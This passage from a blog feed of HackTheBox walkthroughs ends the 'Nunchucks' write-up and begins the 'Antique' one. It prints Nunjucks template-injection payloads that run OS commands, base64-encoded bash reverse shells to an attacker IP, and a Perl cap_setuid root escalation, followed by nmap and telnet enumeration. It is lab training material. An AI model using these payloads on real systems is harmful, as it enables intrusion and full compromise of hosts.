</span></span><span class="line"><span class="cl">total 0<span class="se">\n</span>
</span></span></code></pre></div><p>I definitely can execute OS command 😮!</p>
<h4 id="reverse-shell">Reverse shell</h4>
<p>I tried to inject my SSH pubkey and login, but a password prompt pops out. Therefore, I will use a base64 encoded reverse shell.</p>
<p>The payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.46/53 0&gt;&amp;1&#34;&#39;</span> <span class="p">|</span> base64
</span></span><span class="line"><span class="cl">YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo<span class="o">=</span>
</span></span></code></pre></div><p>Now I&rsquo;ll put that payload to david&rsquo;s home, and execute it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo= | base64 -d &gt; ~/.0mochi.sh &amp;&amp; chmod +x ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -l ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> david david <span class="m">50</span> Nov  <span class="m">5</span> 15:32 /home/david/.0mochi.sh<span class="se">\n</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span></code></pre></div><p>On my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>                                                      
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.46<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.122<span class="o">]</span> <span class="m">39352</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1009<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">david@nunchucks:/var/www/store.nunchucks$ id  
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
</span></span><span class="line"><span class="cl">david@nunchucks:/var/www/store.nunchucks$
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Under <code>/opt</code> there is a backup script written in Perl.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/opt$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">16</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">19</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x  <span class="m">1</span> root root  <span class="m">838</span> Sep  <span class="m">1</span> 12:53 backup.pl
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 web_backups
</span></span><span class="line"><span class="cl">david@nunchucks:/opt$ ls web_backups/ -l
</span></span><span class="line"><span class="cl">total <span class="m">14944</span>
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root david <span class="m">7651273</span> Sep <span class="m">26</span> 01:06 backup_2021-09-26-1632618416.tar
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root david <span class="m">7651273</span> Sep <span class="m">26</span> 01:18 backup_2021-09-26-1632619104.tar
</span></span></code></pre></div><p>The script code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/perl</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">strict</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(strftime)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">DBI</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(setuid)</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nn">POSIX::</span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$tmpdir</span>        <span class="o">=</span> <span class="s">&#34;/tmp&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$backup_main</span> <span class="o">=</span> <span class="s">&#39;/var/www&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$now</span> <span class="o">=</span> <span class="n">strftime</span><span class="p">(</span><span class="s">&#34;%Y-%m-%d-%s&#34;</span><span class="p">,</span> <span class="nb">localtime</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$tmpbdir</span> <span class="o">=</span> <span class="s">&#34;$tmpdir/backup_$now&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">sub</span> <span class="nf">printlog</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">print</span> <span class="s">&#34;[&#34;</span><span class="p">,</span> <span class="n">strftime</span><span class="p">(</span><span class="s">&#34;%D %T&#34;</span><span class="p">,</span> <span class="nb">localtime</span><span class="p">),</span> <span class="s">&#34;] $_[0]\n&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">sub</span> <span class="nf">archive</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">printlog</span> <span class="s">&#34;Archiving...&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2&gt;/dev/null&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">printlog</span> <span class="s">&#34;Backup complete in $tmpbdir/backup_$now.tar&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="vg">$&gt;</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">die</span> <span class="s">&#34;You must run this script as root.\n&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Backup starts.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">&amp;</span><span class="n">archive</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Moving $tmpbdir/backup_$now to /opt/web_backups&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Removing temporary directory&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">printlog</span> <span class="s">&#34;Completed&#34;</span><span class="p">;</span>
</span></span></code></pre></div><p>When I run it, I find that I passed the first if statement, which checks for root priv.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/opt$ ./backup.pl 
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:43<span class="o">]</span> Backup starts.
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:43<span class="o">]</span> Archiving...
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Backup <span class="nb">complete</span> in /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803.tar
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Moving /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803 to /opt/web_backups
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Removing temporary directory
</span></span><span class="line"><span class="cl"><span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Completed
</span></span><span class="line"><span class="cl">david@nunchucks:/opt$ 
</span></span></code></pre></div><p>A quick check on Perl capabilities reveals that it has <code>cap_setuid+ep</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/tmp$ getcap <span class="k">$(</span>which perl<span class="k">)</span>
</span></span><span class="line"><span class="cl">/usr/bin/perl <span class="o">=</span> cap_setuid+ep
</span></span></code></pre></div><h4 id="exploit-cap_setuidep">Exploit cap_setuid+ep</h4>
<p>I tried the <a href="https://gtfobins.github.io/#perl">GTFObins</a> way to exploit the <code>cap_setuid</code> capability, but it didn&rsquo;t spawn me a root shell. However, executing <code>whoami</code> still shows that I&rsquo;m root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/tmp$ /usr/bin/perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/bash&#34;;&#39;</span>
</span></span><span class="line"><span class="cl">david@nunchucks:/tmp$ /usr/bin/perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;whoami&#34;;&#39;</span>
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>I also couldn&rsquo;t get the root flag, it returned with permission denied.</p>
<p>The next thing I tried was reusing the backup script, but with all of the code except the header stripped off and I changed the system command for executing reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@nunchucks:/tmp$ cat .0mochi.pl 
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/perl</span>
</span></span><span class="line"><span class="cl">use strict<span class="p">;</span>
</span></span><span class="line"><span class="cl">use POSIX qw<span class="o">(</span>strftime<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">use DBI<span class="p">;</span>
</span></span><span class="line"><span class="cl">use POSIX qw<span class="o">(</span>setuid<span class="o">)</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">POSIX::setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.46/53 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">david@nunchucks:/tmp$ chmod +x .0mochi.pl 
</span></span></code></pre></div><p>And it worked!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.46<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.122<span class="o">]</span> <span class="m">39386</span>
</span></span><span class="line"><span class="cl">root@nunchucks:/tmp# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20211105233721153.png" alt="image-20211105233721153"  /></div>
</p>
<p>The flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@nunchucks:/tmp# cat /root/root.txt
</span></span><span class="line"><span class="cl">cat /root/root.txt
</span></span><span class="line"><span class="cl">1d2cc...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Antique</title>
      <link>https://fahmifj.github.io/hackthebox/antique/</link>
      <pubDate>Wed, 20 Oct 2021 06:05:34 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/antique/</guid>
      <description>Antique is one of the machines listed in the HTB printer exploitation track. It features a network printer that stores its password in plain text and is readable via SNMP. The password can be used to login into the telnet service, where it allows OS command execution, which can then be abused to gain initial access to the system. There is a CUPS service on this machine that can be exploited to read arbitrary files in the system.</description>
      <content:encoded><![CDATA[<p>Antique is one of the machines listed in the HTB printer exploitation track. It features a network printer that stores its password in plain text and is readable via SNMP. The password can be used to login into the telnet service, where it allows OS command execution, which can then be abused to gain initial access to the system. There is a <a href="https://www.cups.org/">CUPS</a> service on this machine that can be exploited to read arbitrary files in the system.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SNMP enumeration</li>
<li>Printer Exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Snmpwalk</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<h4 id="tcp">TCP</h4>
<p>For TCP, <code>nmap</code> discovers 3 open ports: FTP on 22, two CUPS http servers (?) on port 9090 and 9797</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «antique» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ nmap  -p- -oA nmap/all-tcp-antique 10.10.11.107   
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-15 16:13 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.107
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.076s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
</span></span><span class="line"><span class="cl">23/tcp   open  telnet
</span></span><span class="line"><span class="cl">9090/tcp open  zeus-admin
</span></span><span class="line"><span class="cl">9797/tcp open  unknown
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 121.42 seconds
</span></span><span class="line"><span class="cl">→ kali@kali «antique» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -p 23,9090,9797 -oA nmap/default-script-antique 10.10.11.107 
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-15 16:29 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.107
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.052s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">23/tcp   open  telnet?
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     JetDirect
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Password:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   NULL: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    JetDirect
</span></span><span class="line"><span class="cl">9090/tcp open  ipp     CUPS 1.6
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: CUPS/1.6
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Bad Request - CUPS v1.6.1
</span></span><span class="line"><span class="cl">9797/tcp open  ipp     CUPS 1.6
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: CUPS/1.6
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Bad Request - CUPS v1.6.1
</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port23-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>10/15%Time<span class="o">=</span>6169E4A5%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NUL
</span></span><span class="line"><span class="cl">SF:L,F,<span class="s2">&#34;\nHP\x20JetDirect\n\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,19,<span class="s2">&#34;\nHP\x20JetDirect\n\nPa
</span></span></span><span class="line"><span class="cl"><span class="s2">...[SNIP]...
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class="line"><span class="cl"><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 176.73 seconds
</span></span></span></code></pre></div><h4 id="udp">UDP</h4>
<p>For UDP, <code>nmap</code> discovers SNMP on 161.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «antique» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ sudo nmap -sU --top-ports <span class="m">20</span> -sV -oA nmap/20-udp-antique 10.10.11.107
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-15 17:48 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.107
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.17s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE         SERVICE      VERSION
</span></span><span class="line"><span class="cl">53/udp    open<span class="p">|</span>filtered domain
</span></span><span class="line"><span class="cl">67/udp    open<span class="p">|</span>filtered dhcps
</span></span><span class="line"><span class="cl">68/udp    open<span class="p">|</span>filtered dhcpc
</span></span><span class="line"><span class="cl">69/udp    open<span class="p">|</span>filtered tftp
</span></span><span class="line"><span class="cl">123/udp   closed        ntp
</span></span><span class="line"><span class="cl">135/udp   closed        msrpc
</span></span><span class="line"><span class="cl">137/udp   closed        netbios-ns
</span></span><span class="line"><span class="cl">138/udp   open<span class="p">|</span>filtered netbios-dgm
</span></span><span class="line"><span class="cl">139/udp   open<span class="p">|</span>filtered netbios-ssn
</span></span><span class="line"><span class="cl">161/udp   open          snmp         SNMPv1 server <span class="o">(</span>public<span class="o">)</span>
</span></span><span class="line"><span class="cl">162/udp   closed        snmptrap
</span></span><span class="line"><span class="cl">445/udp   open<span class="p">|</span>filtered microsoft-ds
</span></span><span class="line"><span class="cl">500/udp   closed        isakmp
</span></span><span class="line"><span class="cl">514/udp   open<span class="p">|</span>filtered syslog
</span></span><span class="line"><span class="cl">520/udp   closed        route
</span></span><span class="line"><span class="cl">631/udp   open<span class="p">|</span>filtered ipp
</span></span><span class="line"><span class="cl">1434/udp  open<span class="p">|</span>filtered ms-sql-m
</span></span><span class="line"><span class="cl">1900/udp  closed        upnp
</span></span><span class="line"><span class="cl">4500/udp  open<span class="p">|</span>filtered nat-t-ike
</span></span><span class="line"><span class="cl">49152/udp open<span class="p">|</span>filtered unknown
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 86.95 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-23---ftp">TCP 23 - FTP</h3>
<p>On google JetDirect has blank as default password, but it doesn&rsquo;t work here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «antique» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ nc -vn 10.10.11.107 <span class="m">23</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.107<span class="o">]</span> <span class="m">23</span> <span class="o">(</span>telnet<span class="o">)</span> open
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HP JetDirect
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">Password:  
</span></span><span class="line"><span class="cl">Invalid password
</span></span></code></pre></div><h3 id="tcp-9090----cups">TCP 9090 -  CUPS</h3>
<p>Visiting port 9090 on browser displays a bad request message.</p>
<p><div class="img-container"><img src="imgs/image-20211016040206248.png" alt="image-20211016040206248"  /></div>
</p>
<p>But with <code>nc</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «antique» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ nc -vn 10.10.11.107 <span class="m">9090</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.107<span class="o">]</span> <span class="m">9090</span> <span class="o">(</span>?<span class="o">)</span> open
</span></span><span class="line"><span class="cl">GET /
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HTTP/0.9 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Date: Fri, <span class="m">15</span> Oct <span class="m">2021</span> 21:00:42 GMT
</span></span><span class="line"><span class="cl">Server: CUPS/1.6
</span></span><span class="line"><span class="cl">Content-Language: en_US
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
</span></span><span class="line"><span class="cl">Last-Modified: Thu, <span class="m">13</span> May <span class="m">2021</span> 05:36:41 GMT
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">3792</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//W3C//DTD HTML 4.0 Transitional//EN&#34;</span> <span class="s2">&#34;http://www.w3.org/TR/html4/loose.dtd&#34;</span>&gt;
</span></span><span class="line"><span class="cl">&lt;HTML&gt;
</span></span><span class="line"><span class="cl">&lt;HEAD&gt;
</span></span><span class="line"><span class="cl">        &lt;META HTTP-EQUIV<span class="o">=</span><span class="s2">&#34;Content-Type&#34;</span> <span class="nv">CONTENT</span><span class="o">=</span><span class="s2">&#34;text/html; charset=utf-8&#34;</span>&gt;
</span></span><span class="line"><span class="cl">        &lt;TITLE&gt;Home - CUPS 1.6.1&lt;/TITLE&gt;
</span></span><span class="line"><span class="cl">        &lt;LINK <span class="nv">REL</span><span class="o">=</span><span class="s2">&#34;STYLESHEET&#34;</span> <span class="nv">TYPE</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/cups.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl">        &lt;LINK <span class="nv">REL</span><span class="o">=</span><span class="s2">&#34;SHORTCUT ICON&#34;</span> <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/images/cups-icon.png&#34;</span> <span class="nv">TYPE</span><span class="o">=</span><span class="s2">&#34;image/png&#34;</span>&gt;
</span></span><span class="line"><span class="cl">&lt;/HEAD&gt;
</span></span><span class="line"><span class="cl">&lt;BODY&gt;
</span></span><span class="line"><span class="cl">&lt;TABLE <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;page&#34;</span> <span class="nv">SUMMARY</span><span class="o">=</span><span class="s2">&#34;{title}&#34;</span>&gt;
</span></span><span class="line"><span class="cl">&lt;TR&gt;&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;body&#34;</span>&gt;
</span></span><span class="line"><span class="cl">&lt;TABLE <span class="nv">BORDER</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">CELLPADDING</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">CELLSPACING</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">SUMMARY</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;
</span></span><span class="line"><span class="cl">&lt;TR <span class="nv">HEIGHT</span><span class="o">=</span><span class="s2">&#34;36&#34;</span>&gt;
</span></span><span class="line"><span class="cl">&lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.cups.org/&#34;</span> <span class="nv">TARGET</span><span class="o">=</span><span class="s2">&#34;_blank&#34;</span>&gt;&lt;IMG
</span></span><span class="line"><span class="cl"><span class="nv">SRC</span><span class="o">=</span><span class="s2">&#34;/images/left.gif&#34;</span> <span class="nv">WIDTH</span><span class="o">=</span><span class="s2">&#34;64&#34;</span> <span class="nv">HEIGHT</span><span class="o">=</span><span class="s2">&#34;36&#34;</span> <span class="nv">BORDER</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">ALT</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span></span><span class="line"><span class="cl">&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;sel&#34;</span>&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/&#34;</span>&gt;<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>Home<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>&lt;/A&gt;&lt;/TD&gt;
</span></span><span class="line"><span class="cl">&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;unsel&#34;</span>&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/admin&#34;</span>&gt;<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>Administration<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>&lt;/A&gt;&lt;/TD&gt;
